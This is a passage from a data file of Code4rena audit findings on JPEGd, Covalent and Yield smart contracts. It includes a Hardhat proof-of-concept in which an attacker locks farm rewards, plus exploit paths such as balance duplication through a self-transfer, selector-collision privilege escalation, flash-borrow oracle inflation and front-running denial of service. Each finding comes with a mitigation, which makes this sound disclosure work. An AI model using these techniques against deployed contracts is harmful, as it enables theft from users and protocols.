          await network.provider.send(""evm_setAutomine"", [false]);

          // prepare 
          const attacker = bob;
          await lpTokens[0].transfer(alice.address, units(1000));
          await lpTokens[0].transfer(attacker.address, units(1000));
          await lpTokens[0].connect(alice).approve(farming.address, units(1000));
          await mineBlocks(1);

          // attacker direct deposit lp token to the pool 
          await lpTokens[0].connect(attacker).transfer(farming.address, units(100));

          // create new pool
          await farming.add(10, lpTokens[0].address);
          await mineBlocks(1);
          expect(await farming.poolLength()).to.equal(1);

          let pool = await farming.poolInfo(0);
          expect(pool.lpToken).to.equal(lpTokens[0].address);
          expect(pool.allocPoint).to.equal(10);

          // create new epoch ==> balance of pool will be 1000 
          let blockNumber = await ethers.provider.getBlockNumber();
          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);

          // alice deposit 
          await farming.connect(alice).deposit(0, units(100));
          await mineBlocks(1);

          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);

          // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!
          await mineBlocks(13);
          console.log(""reward of alice: "", (await   farming.pendingReward(0, alice.address)).toString());
          expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from('500'));
        });

In the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses `pool.lpToken.balanceOf(address(this))` to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.

### Tools Used

typescript

### Recommended Mitigation Steps

Declare a new variable `totalLPSupply` to the struct `PoolInfo`, and use it instead of `pool.lpToken.balanceOf(address(this))`.






***"
107.md,Oracle data feed is insufficiently validated.,medium,"Price can be stale and can lead to wrong `answer` return value.

### Proof of Concept

Oracle data feed is insufficiently validated. There is no check for stale price and round completeness. Price can be stale and can lead to wrong  `answer`  return value.

```
function _collateralPriceUsd() internal view returns (uint256) {
        int256 answer = oracle.latestAnswer();
        uint8 decimals = oracle.decimals();

        require(answer > 0, ""invalid_oracle_answer"");

        ...

```

[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>

### Recommended Mitigation Steps

Validate data feed

```
function _collateralPriceUsd() internal view returns (uint256) {

(uint80 roundID, int256 answer, , uint256 timestamp, uint80 answeredInRound) = oracle.latestRoundData();
   
    require(answer > 0, ""invalid_oracle_answer"");
    require(answeredInRound >= roundID, ""ChainLink: Stale price"");
    require(timestamp > 0, ""ChainLink: Round not complete"");

         ...

```






***"
107.md,Wrong calculation for `yVault` price per share if decimals != 18,medium,"The [yVault.getPricePerFullShare()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L196) function calculates the price per share by multiplying with `1e18` token decimals with the assumption that the underlying token always has 18 decimals. `yVault` has the same amount of decimals as it's underlying token see ([yVault.decimals()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L70))

But tokens don't always have `1e18` decimals (e.g. USDC).

### Impact

The price per share calculation does not return the correct price for underlying tokens that do not have 18 decimals. This could lead to paying out too little or too much and therefore to a loss for either the protocol or the user.

### Proof of Concept

Following test will fail with the current implementation when the underlying vault token has 6 decimals:

*NOTE: `units()` helper function was adapted to accept the desired decimals.*

```typescript
it.only(""should mint the correct amount of tokens for tokens with 6 decimals"", async () => {
  const DECIMALS = 6;

  await token.setDecimals(DECIMALS);
  expect(await yVault.decimals()).to.equal(DECIMALS);

  expect(await yVault.getPricePerFullShare()).to.equal(0);
  await token.mint(user1.address, units(1000, DECIMALS));
  await token.connect(user1).approve(yVault.address, units(1000, DECIMALS));

  await yVault.connect(user1).deposit(units(500, DECIMALS));
  expect(await yVault.balanceOf(user1.address)).to.equal(units(500, DECIMALS));

  await token.mint(strategy.address, units(500, DECIMALS));
  expect(await yVault.getPricePerFullShare()).to.equal(units(2, DECIMALS));
});
```

Fails with following error: `AssertionError: Expected ""2000000000000000000"" to be equal 2000000`

### Recommended mitigation steps

Use vault `decimals()` instead of hardcoded `1e18` decimals.

```solidity
function getPricePerFullShare() external view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return 0;
    return (balance() * (10**decimals())) / supply; // @audit-info use `decimals()` instead of hardcoded `1e18`
}
```





***"
107.md,`_swapUniswapV2` may use an improper `path` which can cause a loss of the majority of the rewardTokens,medium,"[StrategyPUSDConvex.sol#L311-L334](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L311-L334)<br>

```solidity
function harvest(uint256 minOutCurve) external onlyRole(STRATEGIST_ROLE) {
    convexConfig.baseRewardPool.getReward(address(this), true);

    //Prevent `Stack too deep` errors
    {
        DexConfig memory dex = dexConfig;
        IERC20[] memory rewardTokens = strategyConfig.rewardTokens;
        IERC20 _weth = weth;
        for (uint256 i = 0; i < rewardTokens.length; i++) {
            uint256 balance = rewardTokens[i].balanceOf(address(this));

            if (balance > 0)
                //minOut is not needed here, we already have it on the Curve deposit
                _swapUniswapV2(
                    dex.uniswapV2,
                    rewardTokens[i],
                    _weth,
                    balance,
                    0
                );
        }

        uint256 wethBalance = _weth.balanceOf(address(this));
        require(wethBalance > 0, ""NOOP"");
        ...
```

[StrategyPUSDConvex.sol#L410-L430](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L410-L430)<br>

```solidity
 function _swapUniswapV2(
    IUniswapV2Router router,
    IERC20 tokenIn,
    IERC20 tokenOut,
    uint256 amountIn,
    uint256 minOut
) internal {
    tokenIn.safeIncreaseAllowance(address(router), amountIn);

    address[] memory path = new address[](2);
    path[0] = address(tokenIn);
    path[1] = address(tokenOut);

    router.swapExactTokensForTokens(
        amountIn,
        minOut,
        path,
        address(this),
        block.timestamp
    );
}
```

In the current implementation, `rewardTokens` from the underlying strategy will be swapped to `weth` first then `weth` -> `usdc`.

However, the `path` used for swapping from `rewardToken` -> `weth` is hardcoded as `[rewardToken, weth]`, which may not be the optimal route.

For example, the majority liquidity for a particular `rewardToken` may actually be in the `rewardToken/USDC` pool. Swapping through the `rewardToken/WETH` with low liquidity may end up getting only a dust amount of WETH.

### Recommended Mitigation Steps

Consider allowing the admin to set a path for the rewardTokens.





***"
107.md,The noContract modifier does not work as expected.,medium,"heretic, and Cr4ckM3_

[yVault.sol#L61](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/vaults/yVault/yVault.sol#L61)<br>
[yVaultLPFarming.sol#L54](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/farming/yVaultLPFarming.sol#L54)<br>

The expectation of the noContract modifier is to allow access only to accounts inside EOA or Whitelist, if access is controlled using ! access control with \_account.isContract(), then because isContract() gets the size of the code length of the account in question by relying on extcodesize/address.code.length, this means that the restriction can be bypassed when deploying a smart contract through the smart contract's constructor call.

### Recommended Mitigation Steps

Modify the code to `require(msg.sender == tx.origin);`






***"
107.md,Chainlink pricer is using a deprecated API,medium,"According to Chainlink's documentation, the latestAnswer function is deprecated. This function might suddenly stop working if Chainlink stops supporting deprecated APIs. And the old API can return stale data.

### Proof of Concept

[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>
[NFTVault.sol#L459](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L459)<br>

### Recommended Mitigation Steps

Use the latestRoundData function to get the price instead. Add checks on the return data with proper revert messages if the price is stale or the round is uncomplete.<br>
<https://docs.chain.link/docs/price-feeds-api-reference/>






***"
107.md,Division before Multiplication May Result In No Interest Being Accrued,medium,"[NFTVault.sol#L590-L595](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L590-L595)<br>

There is a division before multiplication bug in `NFTVault._calculateAdditionalInterest()` which may result in no interesting being accrued and will have significant rounding issues for tokens with small decimal places.

This issue occurs since an intermediate calculation of  `interestPerSec` may round to zero and therefore the multiplication by `elapsedTime` may remain zero.

Furthermore, even if `interestPerSec > 0` there will still be rounding errors as a result of doing division before multiplication and `_calculatedInterest()` will be understated.

This issue is significant as one divisor is 365 days = 30,758,400 (excluding the rate). Since many ERC20 tokens such as USDC and USDT only have 6 decimal places a numerator of less 30 \* 10^6 will round to zero.

The rate also multiplies into the denominator. e.g. If the rate is 1% then the denominator will be equivalent to `1 / rate * 30 * 10^6 = 3,000 * 10^6`.

### Proof of Concept

The order of operations for the interest calculations

*   `totalDebtAmount`
*   MUL `settings.debtInterestApr.numerator`
*   DIV `settings.debtInterestApr.denominator`
*   DIV `365 days`
*   MUL `elapsedTime`

If the intermediate value of `interestPerSec = 0` then the multiplication by `elapsedTime` will still be zero and no interested will be accrued.

Excerpt from `NFTVault._calculateAdditionalInterest()`.

            uint256 interestPerYear = (totalDebtAmount *
                settings.debtInterestApr.numerator) /
                settings.debtInterestApr.denominator;
            uint256 interestPerSec = interestPerYear / 365 days;

            return elapsedTime * interestPerSec;

### Recommended Mitigation Steps

This issue may be resolved by performing the multiplication by `elapsedTime` before the division by the denominator or `365 days`.

            uint256 interestAccrued = (elapsedTime * 
                totalDebtAmount *
                settings.debtInterestApr.numerator) /
                settings.debtInterestApr.denominator /
                365 days;

            return  interestAccrued;







***"
43.md,Usage of an incorrect version of `Ownbale` library can potentially malfunction all `onlyOwner` functions,high,"[`DelegatedStaking.sol` L62-L63](https://github.com/code-423n4/2021-10-covalent/blob/ded3aeb2476da553e8bb1fe43358b73334434737/contracts/DelegatedStaking.sol#L62-L63)

```solidity
// this is used to have the contract upgradeable
function initialize(uint128 minStakedRequired) public initializer {
```

Based on the context and comments in the code, the `DelegatedStaking.sol` contract is designed to be deployed as an upgradeable proxy contract.

However, the current implementation is using an non-upgradeable version of the `Ownbale` library: `@openzeppelin/contracts/access/Ownable.sol` instead of the upgradeable version: `@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol`.

A regular, non-upgradeable `Ownbale` library will make the deployer the default owner in the constructor. Due to a requirement of the proxy-based upgradeability system, no constructors can be used in upgradeable contracts. Therefore, there will be no owner when the contract is deployed as a proxy contract.

As a result, all the `onlyOwner` functions will be inaccessible.

##### Recommendation
Use `@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol` and `@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol` instead.

And change the `initialize()` function to:

```solidity
function initialize(uint128 minStakedRequired) public initializer {
    __Ownable_init();
    ...
}
```"
43.md,`unstake` should update exchange rates first,high,"The `unstake` function does not immediately update the exchange rates. It first computes the `validatorSharesRemove = tokensToShares(amount, v.exchangeRate)` **with the old exchange rate**.

Only afterwards, it updates the exchange rates (if the validator is not disabled):

```solidity
// @audit shares are computed here with old rate
uint128 validatorSharesRemove = tokensToShares(amount, v.exchangeRate);
require(validatorSharesRemove > 0, ""Unstake amount is too small"");

if (v.disabledEpoch == 0) {
    // @audit rates are updated here
    updateGlobalExchangeRate();
    updateValidator(v);
    // ...
}
```

#### Impact
More shares for the amount are burned than required and users will lose rewards in the end.

#### POC
Demonstrating that users will lose rewards:

1.  Assume someone staked `1000 amount` and received `1000 shares`, and `v.exchangeRate = 1.0`. (This user is the single staker)
2.  Several epochs pass, interest accrues, and `1000 tokens` accrue for the validator, `tokensGivenToValidator = 1000`. User should be entitled to 1000 in principal + 1000 in rewards = 2000 tokens.
3.  But user calls `unstake(1000)`, which sets `validatorSharesRemove = tokensToShares(amount, v.exchangeRate) = 1000 / 1.0 = 1000`. **Afterwards**, the exchange rate is updated: `v.exchangeRate += tokensGivenToValidator / totalShares = 1.0 + 1.0 = 2.0`. The staker is updated with `s.shares -= validatorSharesRemove = 0` and `s.staked -= amount = 0`. And the user receives their 1000 tokens but notice how the user's shares are now at zero as well.
4.  User tries to claim rewards calling `redeemAllRewards` which fails as the `rewards` are 0.

If the user had first called `redeemAllRewards` and `unstake` afterwards they'd have received their 2000 tokens.

#### Recommended Mitigation Steps
The exchange rates always need to be updated first before doing anything.
Move the `updateGlobalExchangeRate()` and `updateValidator(v)` calls to the beginning of the function."
43.md,reward tokens could get lost due to rounding down,medium,"#### Impact
The function `depositRewardTokens` divides the ""amount"" of tokens by `allocatedTokensPerEpoch` to calculate the `endEpoch`.
When ""amount"" isn't a multiple of `allocatedTokensPerEpoch` the result of the division will be rounded down,
effectively losing a number of tokens for the rewards.

For example if `allocatedTokensPerEpoch` is set to 3e18 and ""amount"" is 100e18 then `endEpoch` will be increased with 33e18 and the last 1e18 tokens are lost.

A similar problem occurs here:
-  in `setAllocatedTokensPerEpoch()`, with the recalculation of `endEpoch`
-  in `takeOutRewardTokens()`, with the retrieval of tokens
-  in \_stake(), when initializing `endEpoch` (e.g. when `endEpoch`==0)

#### Proof of Concept
- [`DelegatedStaking.sol` L90-L98](https://github.com/code-423n4/2021-10-covalent/blob/ded3aeb2476da553e8bb1fe43358b73334434737/contracts/DelegatedStaking.sol#L90-L98)
- [`DelegatedStaking.sol` L368-L383](https://github.com/code-423n4/2021-10-covalent/blob/ded3aeb2476da553e8bb1fe43358b73334434737/contracts/DelegatedStaking.sol#L368-L383)

#### Recommended Mitigation Steps
In `depositRewardTokens()` add, in the beginning of function, before the if statement:
```solidity
require(amount % allocatedTokensPerEpoch == 0,""Not multiple"");
```

In `takeOutRewardTokens()` add:
```solidity
require(amount % allocatedTokensPerEpoch == 0,""Not multiple"");
```

Update `setAllocatedTokensPerEpoch()` to something like:

```solidity
if (`endEpoch` != 0) {
...
uint128 futureRewards = ...
require(futureRewards % amount ==0,""Not multiple"");
...\
} else { // to prevent issues with \_stake()
require(rewardsLocked % allocatedTokensPerEpoch==0,""Not multiple"");
}
```"
43.md,Incorrect `updateGlobalExchangeRate` implementation,medium,"#### Impact
`UpdateGlobalExchangeRate` has incorrect implementation when `totalGlobalShares` is zero.

If any user didn't start stake, `totalGlobalShares` is 0, and every stake it will increase.
but there is possibility that `totalGlobalShares` can be 0 amount later by unstake or disable validator.

#### Proof of Concept
This is my test case to proof this issue: [C4_issues.js L76](https://github.com/xYrYuYx/C4-2021-10-covalent/blob/main/test/c4-tests/C4_issues.js#L76)

In my test case, I disabled validator to make `totalGlobalShares` to zero.
And in this case, some reward amount will be forever locked in the contract.
After disable validator, I mined 10 blocks, and 4 more blocks mined due to other function calls,
So total 14 CQT is forever locked in the contract.

#### Tools Used
Hardhat test

#### Recommended Mitigation Steps
Please think again when `totalGlobalShares` is zero."
43.md,Validator can fail to receive commission reward in `redeemAllRewards`,medium,"#### Impact
Validator can fail to receive commission reward by calling `redeemAllRewards`.
There's a check in `redeemAllRewards`

```solidity
uint128 rewards = sharesToTokens(s.shares, v.exchangeRate) - s.staked;
require(rewards > 0, ""Nothing to redeem"");
```

The validator's tx might be reverted here even if he got some commission reward to receive.

#### Proof of Concept
We can trigger the bug by setting `commisionRate` to `1e18 - 1` ([DelegatedStaking.sol L275-L276](https://github.com/code-423n4/2021-10-covalent/blob/main/contracts/DelegatedStaking.sol#L275-L276))

#### Recommended Mitigation Steps
Though this may rarely happen and the validator can redeem the reward through `redeemRewards`, this may cause some issues when the validator is handled by a contract.

I consider calling `redeemRewards` in `redeemAllReawards` as a more succinct way to do this."
12.md,Duplication of Balance,high,"It is possible to duplicate currently held `ink` or `art` within a Cauldron, thereby breaking the contract's accounting system and minting units out of thin air.

The `stir` function of the `Cauldron`, which can be invoked via a `Ladle` operation, caches balances in memory before decrementing and incrementing. As a result, if a transfer to self is performed, the assignment `balances[to] = balancesTo` will contain the added-to balance instead of the neutral balance.

This allows one to duplicate any number of `ink` or `art` units at will, thereby severely affecting the protocol's integrity. A similar attack was exploited in the third bZx hack resulting in a roughly 8 million loss.

Recommend that a `require` check should be imposed prohibiting the `from` and `to` variables to be equivalent."
12.md,auth collision possible,high,"The auth mechanism of `AccessControl.sol` uses function selectors `(msg.sig)` as a `(unique)` role definition. Also the `_moduleCall` allows the code to be extended.

Suppose an attacker wants to add the innocent-looking function ""`left_branch_block(uint32)` ""in a new module. Suppose this module is added via `_moduleCall`, and the attacker gets authorization for the innocent function.

This function happens to have a signature of 0x00000000, which is equal to the root authorization. In this way, the attacker could get authorization for the entire project.

Note: it's pretty straightforward to generate function names for any signature value; you can just brute force it because it's only 4 bytes.

Recommend not allowing third parties to define or suggest new modules and double-checking the function signatures of new functions of a new module for collisions.


```solidity
    function grantRole(bytes4 role, address account) external virtual admin(role) {
        require(role != ROOT, ""Not ROOT role"");
        _grantRole(role, account);
    }
>
    function grantRoot(address account) external virtual admin(ROOT) {
        _grantRole(ROOT, account);
    }
```
> However, given that this could be exploited only through a malicious governance exploit, I would reduce the risk to ""Low."""
12.md,YieldMath.sol / Log2: >= or > ?,high,"The V1 version of `YieldMath.sol` contains "">="" (larger or equal), while the V2 version of `YieldMath.sol` contains "">"" (larger) in the log_2 function.
This change doesn't seem logical and might lead to miss calculations.
The difference is present in several adjacent lines.
```solidity
function log_2 (uint128 x)
...
b = b * b >> 127; if (b >= 0x100000000000000000000000000000000) {b >>= 1; l |= 0x1000000000000000000000000000000;}
```
and

```solidity
function log_2(uint128 x)
...
b = b * b >> 127; if(b > 0x100000000000000000000000000000000) {b >>= 1; l |= 0x1000000000000000000000000000000;}
```

Recommend checking which version is the correct version and fix the incorrect version."
12.md,Potential griefing with DoS by front-running vault creation with same `vaultID`,medium,"The `vaultID` for a new vault being built is required to be specified by the user building a vault via the `build()` function (instead of being assigned by the Cauldron/protocol). An attacker can observe a `build()` as part of a batch transaction in the mempool, identify the `vaultID` being requested, and front-run that by constructing a malicious batch transaction with only the build operation with that same `vaultID`. The protocol would create a vault with that `vaultID` and assign the attacker as its owner. More importantly, the valid batch transaction in the mempool, which was front-run, will later fail to create its vault because that `vaultID` already exists, as per the check on Line180 of `Cauldron.sol`. As a result, the valid batch transaction fails entirely because of the attacker front-running with the observed `vaultID`.

While the attacker gains nothing except the ownership of an empty vault after spending the gas, this could grief the protocol's real users by preventing them from opening a vault and interacting with the protocol in any manner.

The rationale for Medium-severity impact: While the likelihood of this may be low, the impact is high because valid vaults from the Yield front-end will never be successfully created and will lead to a DoS against the entire protocol's functioning. So, with low likelihood and high impact, the severity (according to OWASP) is medium.

Alice uses Yield's front-end to create a valid batch transaction. Evil Eve observes that in the mempool and identifies the `vaultID` of the vault being built by Alice. Eve submits her own batch transaction (without using the front-end) with only a build operation using Alice's `vaultID`. She uses a higher gas price to front-run Alice's transaction and get's the protocol to assign that `vaultID` to herself. Alice's batch transaction later fails because the `vaultID` she requested is already assigned to Eve. Eve can do this for any valid transaction to grief protocol users by wasting her gas to cause DoS.

Recommend mitigating this DoS vector by having the `Cauldron` assign the `vaultID` instead of the user specifying it in the `build()` operation. This would likely require the `build()` to be a separate non-batch transaction followed by other operations that use the `vaultID` assigned in `build()`. Consider the pros/cons of this approach because it will significantly affect the batching/caching logic in `Ladle`.

Alternatively, consider adding validation logic in `Ladle's` batching to revert batches that have only build or a subset of the operations that do not make sense to the protocol's operations per valid recipes, which could be an attacker's signature pattern."
12.md,Uniswap Oracle uses wrong prices,medium,"The Uniswap oracle uses a mock contract with hard-coded prices to retrieve the price, which is not feasible in production. Also, note that even when using the ""real deal"" `@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol`... it does not, in fact, return the prices.

The price could change from the set price. Meanwhile, always updating new prices with `set` will be too slow and gas expensive.

Recommend using `cumulativeTicks = pool.observe([secondsAgo, 0]) // [a_t1, a_t2]` and applying [equation 5.5](https://uniswap.org/whitepaper-v3.pdf) from the Uniswap V3 whitepaper to compute the token0 TWAP.
Note that even the [official `.consult` call](https://github.com/Uniswap/uniswap-v3-periphery/blob/b55e7e81a803082c0328e2826592327da373ab00/contracts/libraries/OracleLibrary.sol#L27) seems to only return the averaged cumulative ticks; you'd still need to compute the `1.0001^timeWeightedAverageTick` in the function."
12.md,Witch can't give back vault after 2x grab,medium,"The `witch.sol` contract gets access to a vault via the grab function in case of liquidation. If the `witch.sol` contract can't sell the debt within a certain amount of time, a second grab can occur.

After the second grab, the information of the original owner of the vault is lost, and the vault can't be returned to the original owner once the debt has been sold.

The `grab` function stores the previous owner in `vaultOwners[vaultId]`, and then the contract itself is the new owner (via `cauldron.grab` and `cauldron._give`).
The `vaultOwners[vaultId]` is overwritten at the second grab

The function buy of `Witch`.sol tried to give the vault back to the original owner, which won't succeed after a second grab. [See the issue page for proof of concept and referenced code](https://github.com/code-423n4/2021-05-yield-findings/issues/8)

Assuming it's useful to give back the vault to the original owner,  recommend making a stack/array of previous owners if multiple instances of the `witch.sol` contract would be used. Or, check if the witch is already the owner (in the `grab` function) and keep the` vaultOwners[vaultId]` if that is the case.



**Editors note:** An alternative submission for this bug was not included in this report but can be found in [Issue #30](https://github.com/code-423n4/2021-05-yield-findings/issues/30)."
12.md,User can redeem more tokens by artificially increasing the chi accrual,medium,"A user can artificially increase the chi accrual (after maturity) by flash borrow on Compound, which affects the exchange rate used by the chi oracle. As a result, the user redeems more underlying tokens with the same amount of fyTokens since the accrual is larger than before.

The `exchangeRateStored` used by chi oracle is calculated based on the `totalBorrows` of `CToken`, which can be artificially increased by a large amount of borrow operated on Compound. Consider a user performing the following steps in a single transaction (assuming that the fyToken is matured):

1. Deposits a large amount of collateral (whether from flash loans or not) and borrow from Compound
2. Burns his fyToken by calling `redeem.`
3. Repays the borrow to Compound

The user only needs to pay for the gas fees of borrowing and repaying (since they happen in the same transaction) but can redeem more underlying tokens than a regular redeem.

Referenced code:
[CompoundMultiOracle.sol#L46](https://github.com/code-423n4/2021-05-yield/blob/main/contracts/oracles/compound/CompoundMultiOracle.sol#L46)
[FYToken.sol#L125](https://github.com/code-423n4/2021-05-yield/blob/main/contracts/FYToken.sol#L125)
[FYToken.sol#L132-L143](https://github.com/code-423n4/2021-05-yield/blob/main/contracts/FYToken.sol#L132-L143)

Recommend making the chi accrual time-weighted to mitigate the manipulation caused by flash borrow and repay."
12.md,Uninitialized or Incorrectly set `auctionInterval` may lead to liquidation engine livelock,medium,"The `grab()` function in Cauldron is used by the Witch or other liquidation engines to grab vaults that are under-collateralized. To prevent re-grabbing without sufficient time for auctioning collateral/debt, the logic uses an `auctionInterval` threshold to give a reasonable window to a liquidation engine that has grabbed the vault.

The `grab()` function has a comment on Line 354: ""// Grabbing a vault protects it for a day from being grabbed by another liquidator. All grabbed vaults will be suddenly released on the 7th of February 2106, at 06:28:16 GMT. I can live with that."" indicating a requirement of the `auctionInterval` being equal to one day. This can happen only if the `auctionInterval` is set appropriately. However, this state variable is uninitialized (defaults to 0) and depends on `setAuctionInterval()` being called with the appropriate `auctionInterval_` value, which is also not validated.

Discussion with the project lead indicated that this comment is incorrect. Nevertheless, it is safer to initialize `auctionInterval` at declaration to a safe default value instead of the current 0, which will allow liquidation engines to re-grab vaults without making any progress on liquidation auction. It is also good to add a threshold check-in `setAuctionInterval()` to ensure the new value meets/exceeds a reasonable default value.

The rationale for Medium-severity impact: While the likelihood of this may be low, the impact is high because liquidation engines will keep re-grabbing vaults from each other and potentially result in liquidation bots entering a live-lock situation without making any progress on liquidation auctions. This will result in collateral being stuck and impact the entire protocol's functioning. So, with low likelihood and high impact, the severity (according to OWASP) is medium.

See [Issue page](https://github.com/code-423n4/2021-05-yield-findings/issues/44) for proof of concept and referenced code.

Recommend:
1. Initialize `auctionInterval`  at declaration with a reasonable default value.
2. Add a threshold check in `setAuctionInterval()` to ensure the new value meets/exceeds a reasonable default value."
12.md,Violation of implicit constraints in batched operations may break protocol assumptions,medium,"The Ladle batching of operations is a complex task (as noted by the project lead) with implicit constraints on what operations can be bundled together in a batch. Operations can/have to appear how many times and in what order/sequence etc. Some examples of these constraints are: `Join Ether` should be the first operation, `Exit Ether` the last, and only one `Join Ether` per batch.

All this complexity is managed currently by anticipating all interactions to happen via their authorized front-end, which uses validated (and currently only revealed on-demand) recipes that adhere to these constraints. There is a plan to open the design up to other front-ends and partner integrating protocols that will also test their batch recipes or integrations for these constraints.

Breaking some of these constraints opens up the protocol to failing transactions, undefined behavior, or potentially loss/lock of funds. Defensive programming suggests enforcing such batch operation constraints in the code and documentation and onboarding checks for defense-in-depth. Relying on documentation or external validation may not be sufficient for arguably the most critical aspect of batched operations which is the only authorized way to interact with the protocol.

The rationale for assigning medium-severity is that, while the likelihood of this may be low because of controlled/validated onboarding on new front-ends or integrating protocols, the impact of accidental deviation from implicit constraints is high. This may result in a transaction failing, or tokens getting locked/lost, thus impact the entire protocol's functioning. So, with low likelihood and high impact, the severity (according to OWASP) is medium.

1. A new front-end project comes up claiming to provide a better user interface than the project's authorized front-end. It does not use the recipe book (correctly) and makes Ladle batches with incorrect operations, thus failing the constraints and leading to protocol failures and token lock/loss.
2. An integrating protocol goes through the approved onboarding and validation but has missed bugs in its recipe for batches, thus failing the constraints and leading to protocol failures and token lock/loss.

Recommend enforcing batch operation constraints explicitly in the code (e.g., with tracking counters/booleans for operations) along with documentation and onboarding validation. This may increase the complexity of the batching code but adds fail-safe defense-in-depth for any mistakes in onboarding validation of implicit constraints, which may affect protocol operations significantly."
12.md,Possible DoS attack when creating `Joins` in `Wand`,medium,"It is possible for an attacker to intendedly create a fake `Join` corresponding to a specific token beforehand to make `Wand` unable to deploy the actual `Join`, causing a DoS attack.

The address of `Join` corresponding to an underlying `asset` is determined as follows and thus unique:

```solidity
Join join = new Join{salt: keccak256(abi.encodePacked(asset))}();
```

Besides, the function `createJoin` in the contract `JoinFactory` is permissionless: Anyone can create the `Join` corresponding to the `asset`. An attacker could then deploy many `Joins` with different common underlying assets (e.g., DAI, USDC, ETH) before the `Wand` deploying them. The attempt of deploying these `Joins` by `Wand` would fail since the attacker had occupied the desired addresses with fake `Joins`, resulting in a DoS attack.

Moreover, the attacker can also perform DoS attacks on newly added assets: He monitors the mempool to find transactions calling the function `addAsset` of `Wand` and front-runs them to create the corresponding `Join` to make the benign transaction fail.

Referenced code:
[JoinFactory.sol#L64-L75](https://github.com/code-423n4/2021-05-yield/blob/main/contracts/JoinFactory.sol#L64-L75)
[Wand.sol#L53](https://github.com/code-423n4/2021-05-yield/blob/main/contracts/Wand.sol#L53)

Recommend enabling access control in `createJoin` (e.g., adding the `auth` modifier) and allowing `Wand` to call it."
12.md,Users can avoid paying borrowing interest after the fyToken matures,medium,"According to the protocol design, users have to pay borrowing interest when repaying the debt with underlying tokens after maturity. However, a user can give his vault to `Witch` and then buy all his collateral using underlying tokens to avoid paying the interest. Besides, this bug could make users less incentivized to repay the debt before maturity and hold the underlying tokens until liquidation.

1. A user creates a new vault and opens a borrowing position as usual.
2. The maturity date passed. If the user wants to close the position using underlying tokens, he has to pay a borrowing interest (line 350 in `Ladle`), which is his debt multiplied by the rate accrual (line 373).
3. Now, the user wants to avoid paying the borrowing interest. He gives his vault to `Witch` by calling the function `batch` of `Ladle` with the operation `GIVE`.
4. He then calls the function `buy` of `Witch` with the corresponding `vaultId` to buy all his collateral using underlying tokens.

In the last step, the `elapsed` time (line 61) is equal to the current timestamp since the vault is never grabbed by `Witch` before, and thus the auction time of the vault, `cauldron.auctions(vaultId)`, is 0 (the default mapping value). Therefore, the collateral is sold at a price of `balances_.art/balances_.ink` (line 74). The user can buy `balances_.ink` amount of collateral using `balances_.art` but not paying for borrowing fees.

Recommend not allowing users to `give` vaults to `Witch`. And to be more careful, requiring `vaultOwners[vaultId]` and `cauldron.auctions(vaultId)` to be non-zero at the beginning of function `buy`."
12.md,auth only works well with external functions,medium,"<!-- appended to end of section -->

The auth modifier of `AccessControl.sol` doesn't work as you would expect.
It checks if you are authorized for `msg.sig`. However, `msg.sig` is the signature of the first function you have called (not the current function). So, if you call function A, which calls function B, the ""auth"" modifier of function B checks if you are authorized for function A!

There is a difference between external and public functions. For external functions, this works as expected because a fresh call (with a new `msg.sig`) is always made.
However, with public functions called from within the same contract, this doesn't happen as the problem described above occurs.

See the issue page for proof of concept, which shows the problem. In the code, several functions have `public` and `auth` combined; see also in the proof of concept.

In the current codebase, I couldn't find a problem situation; however, this could be accidentally introduced with future changes.
It could also be introduced via the `_moduleCall` of Ladle.sol, which allows functions to be defined which might call the public functions.

See [issue #4 page](https://github.com/code-423n4/2021-05-yield-findings/issues/69#issuecomment-854498235) for proof of concept and a list of occurrences of public auth.

Recommend making sure all auth functions use external (still error-prone)
Or, recommend changing the modifier to something like:
```solidity
modifier auth(bytes4 fs) {
require (msg.sig == fs,""Wrong selector"");
require (_hasRole(msg.sig, msg.sender), ""Access denied"");
_;
}
```
```solidity
function setFee(uint256) public auth(this.setFee.selector) {
   .....
}
```"
12.md,Missing checks on debt max/min limits could cause pour to revert,low,"`setDebtLimits()` is used to set the maximum and minimum debt for an underlying and ilk pair. The assumption is that max will be greater than min while setting them because otherwise, the debt checks in `_pour()` for line/dust will fail and revert.

While max and min debt limits can be reset, it is safer to perform input validation on them in `setDebtLimits()`.

A recipe incorrectly interchanges the values of min and max debt, which leads to exceptions in pouring into the vaults.

Recommend adding a check to ensure max > mix."
